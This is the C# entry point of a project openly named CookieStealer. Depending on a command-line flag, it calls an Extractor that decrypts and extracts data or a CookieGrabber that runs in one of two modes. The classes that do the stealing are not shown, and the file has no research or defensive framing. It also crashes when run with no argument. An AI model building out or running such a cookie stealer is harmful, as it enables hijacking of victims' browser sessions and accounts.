using CookieStealer.Utilities;

namespace CookieStealer;

internal static class Program
{
    private static void Main(string[] args)
    {
        Console.Clear();

        if (args.Length > 1)
        {
            Console.WriteLine("Please provide at most one argument.");
            return;
        }
        
        switch (args[0])
        {
            case "-x":
                var extractor = new Extractor();
                extractor.DecryptAndExtract();
                Thread.Sleep(2 * 1000);
                break;
            
            case "-a":
                var cookieGrabberA = new CookieGrabber();
                cookieGrabberA.GrabNRun(1);
                break;
            
            default:
                var cookieGrabberDefault = new CookieGrabber();
                cookieGrabberDefault.GrabNRun(2);
                Thread.Sleep(2 * 1000);
                break;
        }
    }
}